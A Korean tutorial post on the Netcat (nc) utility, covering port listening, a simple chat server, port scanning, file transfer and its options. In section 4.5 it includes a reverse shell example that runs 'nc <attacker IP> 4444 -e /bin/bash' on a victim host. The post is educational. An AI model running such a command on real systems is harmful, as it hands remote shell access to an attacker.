# 🛠️ 리눅스의 Netcat(nc): 네트워크의 스위스 아미 나이프

네트워크 관리, 보안 테스트, 서버 개발을 하다 보면 가끔 단순하지만 강력한 도구가 필요합니다. 그 대표 주자가 바로 **Netcat**입니다. 줄여서 `nc`라고도 부르며, "네트워크의 스위스 아미 나이프"라는 별명을 가지고 있습니다.

---

## 1. Netcat이란 무엇인가?

Netcat은 TCP 또는 UDP 연결을 통해 데이터를 읽고 쓰는 명령줄 유틸리티입니다.
**핵심 특징:**

* **TCP/UDP 양방향 연결** 지원
* **포트 스캐닝** 가능
* **리버스 쉘** 생성 가능 → 해킹/보안 연구에 활용
* **단순한 채팅 서버/클라이언트** 구현 가능
* **파일 전송**까지 지원

Netcat은 사실상 네트워크 계층에서의 **raw socket** 실습 도구라고 봐도 무방합니다.

---

## 2. Netcat 설치

대부분의 리눅스 배포판에는 이미 설치되어 있지만, 없는 경우 다음 명령으로 설치 가능합니다:

```bash
# Ubuntu/Debian
sudo apt install netcat -y

# CentOS/RHEL
sudo yum install nc -y
```

---

## 3. 기본 사용법

Netcat의 기본 구문은 매우 단순합니다:

```bash
nc [옵션] [호스트] [포트]
```

### 예시 1: TCP 연결 테스트

```bash
nc example.com 80
```

* `example.com`의 80번 포트(HTTP)에 연결
* 직접 HTTP 요청을 입력해 테스트할 수 있음
  예: `GET / HTTP/1.1`

---

## 4. 주요 기능과 실습 예시

### 4.1 포트 리스닝 (서버 모드)

```bash
nc -l -p 1234
```

* `-l`: listen 모드
* `-p 1234`: 1234 포트에서 연결 대기
  → 다른 클라이언트에서 접속 가능

---

### 4.2 간단한 채팅 서버

서버:

```bash
nc -l -p 5000
```

클라이언트:

```bash
nc <서버IP> 5000
```

→ 이제 양쪽에서 입력한 메시지가 실시간으로 전달됩니다.

---

### 4.3 포트 스캐닝

```bash
nc -zv 192.168.0.1 20-80
```

* `-z`: 데이터 전송 없이 스캔만
* `-v`: verbose 모드

출력 예:

```
Connection to 192.168.0.1 22 port [tcp/ssh] succeeded!
```

---

### 4.4 파일 전송

서버(받는 쪽):

```bash
nc -l -p 1234 > received.txt
```

클라이언트(보내는 쪽):

```bash
nc <서버IP> 1234 < file.txt
```

→ `file.txt`가 전송되어 `received.txt`로 저장됩니다.

---

### 4.5 리버스 쉘 (보안 연구용)

서버(공격자):

```bash
nc -l -p 4444
```

클라이언트(피해자):

```bash
nc <공격자IP> 4444 -e /bin/bash
```

→ 공격자는 클라이언트에서 쉘을 얻게 됨.
※ **보안 테스트 환경**에서만 사용해야 함.

---

## 5. 유용한 옵션 정리

| 옵션          | 설명                |
| ----------- | ----------------- |
| `-l`        | Listen 모드 (서버 모드) |
| `-p <포트>`   | 특정 포트 지정          |
| `-u`        | UDP 모드            |
| `-z`        | 데이터 전송 없이 스캔만 수행  |
| `-v`        | Verbose 모드        |
| `-e <프로그램>` | 연결 시 실행할 프로그램 지정  |
| `-w <초>`    | 연결 타임아웃 시간        |

---

## 6. 실무 활용 시나리오

### 6.1 방화벽 테스트

시스템이 특정 포트를 통해 통신 가능한지 간단히 테스트할 수 있습니다:

```bash
nc -zv myserver.com 443
```

→ 방화벽이 열려 있으면 연결 성공, 닫혀 있으면 실패 메시지 반환.

---

### 6.2 간이 웹 서버 디버깅

```bash
nc -l -p 8080
```

브라우저에서 `http://<서버IP>:8080` 접속 시 요청 헤더가 직접 콘솔에 찍힘.

---

## 7. 보안 고려 사항

* **리버스 쉘** 기능은 강력하지만 악용될 소지가 큼
* 방화벽에서 **Netcat 트래픽 차단** 권장
* `nc.traditional` vs `ncat` 버전 차이 주의 (일부 기능 다름)

---

## 8. 결론

Netcat은 단순한 네트워크 연결 도구이지만,

* 포트 스캐너
* 파일 전송기
* 간이 서버
* 리버스 쉘 테스트 도구

등 다양한 역할을 수행할 수 있습니다. 네트워크 디버깅이나 보안 교육에서는 필수적으로 배우게 되는 유틸리티입니다.


---

```
# nc -l 0.0.0.0 -p 80
```

`nc -l 0.0.0.0 -p 80` 명령어는 네트워크 유틸리티인 `netcat`(줄여서 `nc`)을 사용하여 특정 포트에서 연결을 수신하는 서버 모드로 실행하라는 의미입니다.

각 옵션의 상세한 의미는 다음과 같습니다:

* **`nc`**: `netcat` 프로그램을 실행합니다. 이 프로그램은 네트워크 연결을 생성하거나 수신하는 데 사용되는 강력한 도구입니다.
* **`-l` (또는 `--listen`)**: 이 옵션은 `netcat`을 "듣기(listen)" 모드로 실행하라는 것을 의미합니다. 즉, 외부에서 들어오는 연결을 수신할 준비를 합니다. 이 옵션이 없으면 `nc`는 기본적으로 연결을 시도하는 클라이언트 모드로 동작합니다.
* **`0.0.0.0`**: 연결을 수신할 IP 주소를 지정합니다. `0.0.0.0`은 "모든 네트워크 인터페이스"를 의미합니다. 즉, 컴퓨터에 할당된 모든 IP 주소(예: 이더넷, Wi-Fi, 루프백 등)를 통해 들어오는 연결을 허용합니다.
* **`-p 80` (또는 `--port 80`)**: 연결을 수신할 포트 번호를 지정합니다. `80`은 일반적으로 웹 서버(HTTP)가 사용하는 표준 포트입니다.

---

### 전체적인 의미

결론적으로, 이 명령어는 **"이 컴퓨터의 모든 네트워크 인터페이스에 대해 80번 포트에서 들어오는 연결을 기다리세요"** 라는 의미를 가집니다.


